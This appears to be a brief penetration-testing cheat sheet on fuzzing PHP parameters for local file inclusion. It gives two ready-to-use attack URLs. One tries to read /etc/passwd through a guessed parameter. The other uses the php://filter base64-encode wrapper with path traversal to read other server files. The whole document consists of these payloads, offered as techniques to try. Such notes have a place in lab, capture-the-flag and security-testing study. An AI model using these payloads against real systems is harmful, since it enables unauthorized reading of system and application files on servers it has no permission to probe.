# Parameter fuzzing
```
# try to find a parameter that works to let attacker view file
hxxp://<MACHINE_IP>:<PORT>/file/to/fuzz/index.php?^FUZZ^=/etc/passwd
```
# Parameter fuzzing with php filter
```
# if just fuzzing doesn't work, use a filter such as base64 encoding/decoding
hxxp://<MACHINE_IP>:<PORT>/file/to/fuzz/index.php?^FUZZ^=php://filter/convert.base64-encode/resource=../file/to/access
```
